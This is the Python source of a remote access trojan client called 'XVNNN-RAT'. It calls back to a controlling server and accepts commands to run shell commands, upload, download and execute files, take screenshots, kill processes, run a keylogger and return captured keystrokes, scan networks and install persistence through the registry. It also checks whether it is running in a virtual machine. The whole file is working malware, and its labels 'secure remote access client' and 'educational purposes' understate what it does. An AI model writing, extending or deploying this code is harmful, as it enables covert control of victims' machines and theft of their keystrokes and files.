#!/usr/bin/env python3
"""
XVNNN-RAT Client
Author: Ali Zafar (alizafarbati@gmail.com)
Version: 1.0.0

Secure remote access client with proper error handling.
"""

import socket
import threading
import time
import platform
import sys
import os
import logging

# Add src to path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from utils.network import send_json, receive_json
from utils.system import get_system_info

# Import modules
from modules.shell import ShellModule
from modules.filemanager import FileManagerModule
from modules.screen import ScreenModule
from modules.systeminfo import SystemInfoModule
from modules.keylogger import KeyloggerModule
from modules.process import ProcessModule
from modules.network import NetworkModule
from modules.persistence import PersistenceModule

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

class XVNNNClient:
    """Secure remote access client"""
    
    def __init__(self, server_host='127.0.0.1', server_port=4444):
        self.server_host = server_host
        self.server_port = server_port
        self.socket = None
        self.running = False
        
        # Initialize modules
        self.modules = {
            'shell': ShellModule(),
            'filemanager': FileManagerModule(),
            'screen': ScreenModule(),
            'systeminfo': SystemInfoModule(),
            'keylogger': KeyloggerModule(),
            'process': ProcessModule(),
            'network': NetworkModule(),
            'persistence': PersistenceModule()
        }
    
    def connect(self):
        """Connect to server with retry logic"""
        max_retries = 5
        retry_delay = 10
        
        for attempt in range(max_retries):
            try:
                logger.info(f"Connection attempt {attempt + 1}/{max_retries}")
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.settimeout(10)
                self.socket.connect((self.server_host, self.server_port))
                
                # Send initial info
                info = get_system_info()
                info['type'] = 'info'
                if send_json(self.socket, info):
                    logger.info("Successfully connected to server")
                    self.listen()
                    return
                else:
                    raise Exception("Failed to send initial info")
                    
            except Exception as e:
                logger.error(f"Connection attempt {attempt + 1} failed: {e}")
                if attempt < max_retries - 1:
                    time.sleep(retry_delay)
                else:
                    logger.error("Max retries reached. Exiting.")
                    return
    
    def listen(self):
        """Listen for server commands with proper error handling"""
        self.running = True
        while self.running:
            try:
                if not self.socket:
                    break
                    
                message = receive_json(self.socket)
                if not message:
                    logger.warning("No message received, checking connection...")
                    # Try to send heartbeat
                    if not send_json(self.socket, {"type": "heartbeat"}):
                        logger.error("Connection lost")
                        break
                    continue
                
                command_type = message.get('type')
                response = self.handle_command(command_type, message)
                
                if response:
                    if not send_json(self.socket, response):
                        logger.error("Failed to send response")
                        break
                        
            except socket.timeout:
                logger.debug("Socket timeout, continuing...")
                continue
            except Exception as e:
                logger.error(f"Error in listen loop: {e}")
                time.sleep(1)
        
        self.cleanup()
    
    def handle_command(self, command_type, message):
        """Handle incoming command with proper error handling"""
        try:
            if command_type == 'info':
                return get_system_info()
            
            elif command_type == 'shell':
                return self.modules['shell'].execute(message.get('command', ''))
            
            elif command_type == 'list_files':
                return self.modules['filemanager'].list_files(message.get('path', ''))
            
            elif command_type == 'upload':
                return self.modules['filemanager'].upload_file(
                    message.get('filename', ''), message.get('data', ''))
            
            elif command_type == 'download':
                return self.modules['filemanager'].download_file(message.get('filename', ''))
            
            elif command_type == 'execute':
                return self.modules['filemanager'].execute_file(message.get('filename', ''))
            
            elif command_type == 'screenshot':
                return self.modules['screen'].capture()
            
            elif command_type == 'system_info':
                return self.modules['systeminfo'].get_info()
            
            elif command_type == 'process_list':
                return self.modules['process'].list_processes()
            
            elif command_type == 'process_kill':
                return self.modules['process'].kill_process(message.get('pid'))
            
            elif command_type == 'start_keylogger':
                return self.modules['keylogger'].start()
            
            elif command_type == 'stop_keylogger':
                return self.modules['keylogger'].stop()
            
            elif command_type == 'get_keys':
                return self.modules['keylogger'].get_logs()
            
            elif command_type == 'network_scan':
                return self.modules['network'].scan(message.get('target', ''))
            
            elif command_type == 'cmd_persist':
                return self.modules['persistence'].add(message.get('method', 'registry'))
            
            else:
                return {'type': 'error', 'message': f'Unknown command: {command_type}'}
                
        except Exception as e:
            logger.error(f"Error handling command {command_type}: {e}")
            return {'type': 'error', 'message': str(e)}
    
    def cleanup(self):
        """Cleanup resources"""
        logger.info("Cleaning up resources...")
        try:
            if self.socket:
                self.socket.close()
        except:
            pass
        
        # Stop keylogger if running
        if 'keylogger' in self.modules:
            self.modules['keylogger'].stop()
        
        self.running = False
        logger.info("Cleanup complete")
    
    def run(self):
        """Run the client"""
        logger.info(f"XVNNN-RAT v1.0.0 Client starting...")
        logger.info(f"Connecting to {self.server_host}:{self.server_port}")
        self.connect()

def check_environment():
    """Check if running in appropriate environment"""
    # Check for VM indicators (educational purposes)
    try:
        if platform.system() == 'Linux':
            with open('/proc/cpuinfo', 'r') as f:
                if 'hypervisor' in f.read().lower():
                    logger.info("Running in virtualized environment")
        elif platform.system() == 'Windows':
            import winreg
            vm_keys = [
                (winreg.HKEY_LOCAL_MACHINE, r'SOFTWARE\VMware, Inc.\VMware Tools'),
                (winreg.HKEY_LOCAL_MACHINE, r'SOFTWARE\Oracle\VirtualBox Guest Additions'),
            ]
            for hkey, path in vm_keys:
                try:
                    winreg.OpenKey(hkey, path)
                    logger.info("Running in virtualized environment")
                    break
                except:
                    pass
    except:
        pass

if __name__ == "__main__":
    check_environment()
    
    # Get server address from command line or use default
    if len(sys.argv) >= 3:
        server_host = sys.argv[1]
        server_port = int(sys.argv[2])
    else:
        server_host = '127.0.0.1'
        server_port = 4444
    
    client = XVNNNClient(server_host, server_port)
    
    try:
        client.run()
    except KeyboardInterrupt:
        logger.info("Client interrupted by user")
        client.cleanup()
    except Exception as e:
        logger.error(f"Fatal error: {e}")
        client.cleanup()
        sys.exit(1)